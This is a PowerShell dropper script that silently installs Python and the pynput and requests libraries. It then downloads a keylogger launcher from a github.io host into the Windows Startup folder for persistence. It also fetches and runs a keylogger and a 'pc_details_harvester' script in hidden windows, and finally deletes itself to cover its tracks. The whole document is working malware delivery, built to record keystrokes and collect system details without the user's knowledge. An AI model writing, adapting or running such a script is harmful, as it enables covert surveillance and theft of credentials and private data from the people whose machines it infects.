# Check if Python is installed
$pythonCheck = python --version 2>&1
if ($pythonCheck -match "Python (\d+\.\d+\.\d+)") {
    Write-Host "Python is already installed. Version: $($matches[1])"
} else {
    Write-Host "Python not found. Downloading and installing..."

    # Define Python version and download URL
    $pythonVersion = "3.12.1"
    $tempFolder = [System.IO.Path]::GetTempPath()  # Get the system's temporary folder
    $pythonInstaller = "$tempFolder\python-installer.exe"
    $downloadUrl = "https://www.python.org/ftp/python/$pythonVersion/python-$pythonVersion-amd64.exe"

    # Download Python installer to the Temp folder
    Invoke-WebRequest -Uri $downloadUrl -OutFile $pythonInstaller -UseBasicP

    # Install Python for the current user (no admin rights needed)
    Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -NoNewWindow -Wait

    # Cleanup installer
    Remove-Item $pythonInstaller -Force

    # Verify installation
    $pythonCheck = python --version 2>&1
    if ($pythonCheck -match "Python (\d+\.\d+\.\d+)") {
        Write-Host "Python installed successfully! Version: $($matches[1])"
    } else {
        Write-Host "Installation failed. Please install manually."
        exit 1
    }
}

# Ensure pip is installed and upgraded
Write-Host "Upgrading pip..."
python -m ensurepip --default-pip
python -m pip install --upgrade pip

# Install pynput library
$library = "pynput"
Write-Host "Installing Python library: $library..."
python -m pip install --user $library

# Install requests library
$library = "requests"
Write-Host "Installing Python library: $library..."
python -m pip install --user $library

# Download all the necessary files from GitHub

# Define StartUp directory (expand %APPDATA% path)
$StartDir = [System.Environment]::GetFolderPath('ApplicationData') + "\Microsoft\Windows\Start Menu\Programs\Startup\RUN.cmd"

# Define URL of the startup script
$StartUrl = "https://mynewaccount-website.github.io/keylogger/RUN.cmd"

# Download the script to StartUp directory
Invoke-WebRequest -Uri $StartUrl -OutFile $StartDir

# Define Temp directory for Python script
$PythonPath = Join-Path $env:TEMP "keylogger.py"

# Define URL of the Python script
$PythonUrl = "https://mynewaccount-website.github.io/keylogger/keylogger.py"

# Download the Python script
Invoke-WebRequest -Uri $PythonUrl -OutFile $PythonPath

# Opening "RUN.cmd" file in startup
Start-Process -FilePath "$StartDir" -WindowStyle Hidden

# Define Temp directory for PC details Python script
$Python_PC_details_Script_Path = Join-Path $env:TEMP "pc_details_harvester.py"

# Define URL of the PC details Python script
$Python_PC_details_URL = "https://mynewaccount-website.github.io/keylogger/pc_details_harvester.py"

# Download the PC details Python script
Invoke-WebRequest -Uri $Python_PC_details_URL -OutFile $Python_PC_details_Script_Path

# Run PC details Python script
Start-Process -FilePath "python" -ArgumentList "$Python_PC_details_Script_Path" -WindowStyle Hidden

# Wait for 5 seconds before cleanup
Start-Sleep -Seconds 5

# Cleanup / auto-delete
$scriptPath = $MyInvocation.MyCommand.Path

# Run a new PowerShell process to delete the script after it finishes
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Remove-Item -Path '$scriptPath' -Force" -WindowStyle Hidden

# Exit the script
exit